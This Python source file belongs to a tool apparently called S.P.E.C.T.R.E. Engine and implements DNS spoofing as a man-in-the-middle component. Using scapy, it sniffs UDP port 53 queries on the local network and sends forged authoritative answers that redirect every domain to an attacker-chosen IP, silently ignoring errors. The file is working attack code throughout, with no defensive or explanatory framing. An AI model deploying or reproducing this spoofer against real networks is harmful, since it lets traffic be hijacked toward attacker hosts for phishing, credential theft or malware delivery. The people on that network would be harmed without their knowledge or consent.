# S.P.E.C.T.R.E. Engine - Licensed under AGPL-3.0
# Copyright (c) 2026 M. Sami Furqan. All rights reserved.
# See LICENSE file for full terms.

"""
core/mitm/dns.py — DNS spoofing implementation.
"""

from __future__ import annotations

import time
from typing import TYPE_CHECKING

from core.mitm._scapy import SCAPY_AVAILABLE, DNS, DNSQR, DNSRR, IP, UDP, Ether, sniff, sendp, conf

if TYPE_CHECKING:
    from PySide6.QtCore import Signal


def _make_spoof_handler(attacker_ip: str, log_signal: Signal) -> object:  # type: ignore[type-arg]
    def _spoof_dns_packet(packet: object) -> None:
        try:
            if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:  # type: ignore[union-attr]
                queried_domain = packet[DNSQR].qname.decode("utf-8", errors="ignore")  # type: ignore[index]
                log_signal.emit(
                    f"Intercepted: {queried_domain} -> Redirecting to {attacker_ip}", "TX"
                )
                spoofed_pkt = (
                    Ether(dst=packet[Ether].src)  # type: ignore[index]
                    / IP(dst=packet[IP].src, src=packet[IP].dst)  # type: ignore[index]
                    / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)  # type: ignore[index]
                    / DNS(
                        id=packet[DNS].id,  # type: ignore[index]
                        qr=1,
                        aa=1,
                        qd=packet[DNS].qd,  # type: ignore[index]
                        an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=attacker_ip),  # type: ignore[index]
                    )
                )
                sendp(spoofed_pkt, verbose=0)
        except Exception:
            pass
    return _spoof_dns_packet


def run_dns_spoof(
    attacker_ip: str,
    running_flag: list[bool],
    log_signal: Signal,  # type: ignore[type-arg]
) -> None:
    """Intercept UDP port-53 queries and redirect all domains to attacker IP."""
    log_signal.emit(
        f"DNS Spoofer Active. Redirecting all queries to {attacker_ip}", "WARN"
    )
    handler = _make_spoof_handler(attacker_ip, log_signal)
    while running_flag[0]:
        try:
            sniff(
                filter="udp port 53",
                iface=conf.iface,
                prn=handler,
                store=0,
                timeout=2,
            )
        except Exception:
            if running_flag[0]:
                time.sleep(0.5)
